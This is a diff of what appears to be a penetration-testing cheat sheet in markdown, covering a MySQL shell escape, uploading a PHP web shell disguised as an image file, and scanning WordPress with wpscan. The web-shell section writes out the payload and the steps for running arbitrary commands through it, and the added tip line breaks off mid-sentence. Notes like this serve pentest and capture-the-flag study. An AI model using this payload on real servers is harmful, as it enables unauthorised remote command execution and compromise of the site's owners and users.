@@ -54,10 +54,12 @@ Run this from mysql to drop to a shell and see what user you are on:
 `\! /bin/sh`
 
 ### Injecting php shell in image file
-- Upload a proper image with the intercept on
+- Upload a proper image with the intercept on the proxy
 - From the proxy, keep the following code as the "image"'s content: `{{imageMagicBytes}} <?php echo system($_REQUEST['whatever']); ?>`
 - Also change the file name and append `.php` (if the image name is image.gif, it would be image.gif.php)
 - Access the file from the browser and add `?whatever={{command}}`
+
+Tip: The `file` command gets a file's type. It may be useful for checking if 
 
 ### Wordpress
 Use `wpscan` to scan Wordpress sites.
